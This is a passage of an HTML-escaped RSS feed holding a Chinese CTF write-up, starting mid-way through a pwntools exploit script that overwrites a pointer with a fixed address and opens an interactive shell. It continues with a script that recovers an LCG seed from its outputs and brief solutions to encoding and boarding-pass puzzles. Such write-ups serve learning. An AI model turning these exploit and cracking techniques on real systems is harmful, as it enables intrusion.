class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x400C2C&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;Your choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;lcg&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lcg&#34;&gt;#&lt;/a&gt; lcg&lt;/h3&gt;
&lt;p&gt;参考这个博客，可以直接出&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1cGVycHJpbnRmL2FydGljbGUvZGV0YWlscy8xMDg5NjQ1NjM=&#34;&gt; https://blog.csdn.net/superprintf/article/details/108964563&lt;/span&gt;&lt;br /&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;gcd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a,b&lt;/span&gt;): &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(b==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;): &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; gcd(b,a%b) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = [&lt;span class=&#34;number&#34;&gt;64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;t = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t.append(s[i]-s[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;all_n = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    all_n.append(gcd((t[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]*t[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]-t[i]*t[i]), (t[i+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]*t[i]-t[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]*t[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]))) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MMI = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; A, n,s=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,t=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,N=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;: (n &amp;lt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; t%N &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; MMI(n, A%n, t, s-A//n*t, N &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; n),-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)[n&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#逆元计算&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; n &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; all_n:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    n=&lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; n==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; (n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a=(s[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]-s[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])*MMI((s[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]-s[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]),n)%n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a_phi=MMI(a,n)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b=(s[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]-a*s[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])%n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    seed = (a_phi*(s[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]-b))%n&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(long_to_bytes(seed))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc&#34;&gt;#&lt;/a&gt; Misc&lt;/h2&gt;
&lt;h3 id=&#34;加密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加密&#34;&gt;#&lt;/a&gt; 加密？&lt;/h3&gt;
&lt;p&gt;跳舞的小人解出密码：SHERLOCK&lt;/p&gt;
&lt;p&gt;打开后看到一个空白的 txt 文件，查看内码，零宽解出：JKGASwqeeh!@$&lt;/p&gt;
&lt;p&gt;得到这个：63756D746374667B69745F69735F63727970746F3F7D&lt;/p&gt;
&lt;p it_is_crypto?=&#34;&#34;&gt;base16 解密：cumtctf&lt;/p&gt;
&lt;h3 id=&#34;社工&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#社工&#34;&gt;#&lt;/a&gt; 社工？&lt;/h3&gt;
&lt;p&gt;大意了，WANG/JIA 中间的斜杠还要保留&lt;/p&gt;
&lt;p&gt;去这里扫一下机票上的二维码：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv&#34;&gt;https://demo.dynamsoft.com/barcode-reader/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;得到信息：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682435349/Typera/2023/04/6761b9a34806e510c91173b2704cebfa.png&#34; alt=&#34;image-20230425230905993&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后去搜一下飞机票二维码的数据信息&lt;/p&gt;
&lt;p&gt;M1 就是旅客姓名&lt;/p&gt;
&lt;p WANGJIA=&#34;&#34;&gt;flag : cumtctf&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
